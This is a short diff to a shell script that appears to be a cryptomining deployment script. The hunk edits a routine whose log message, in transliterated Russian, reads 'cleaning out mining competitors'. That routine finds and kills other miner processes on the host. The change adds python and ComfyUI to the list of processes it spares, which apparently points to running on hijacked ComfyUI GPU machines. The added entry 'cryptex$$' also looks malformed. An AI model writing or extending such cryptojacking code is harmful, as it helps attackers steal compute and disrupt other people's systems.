@@ -93,7 +93,7 @@ find_working_pool() {
 cleanup_miner_processes() {
     echo "chistka konkurentov majninga..." | tee -a "$LOGFILE"
     local patterns="miner|xmrig|lolMiner|crypto|eth|xmr"
-    local whitelist="ngrok|ssh|screen|bash|zsh|tmux|$$"
+    local whitelist="ngrok|ssh|screen|bash|zsh|tmux|python|python3|Comfy|ComfyUI|cryptex$$"
     local cleared=0
     if $IS_ROOT; then
         ps aux | grep -Ei "$patterns" | grep -v grep | while read -r line; do
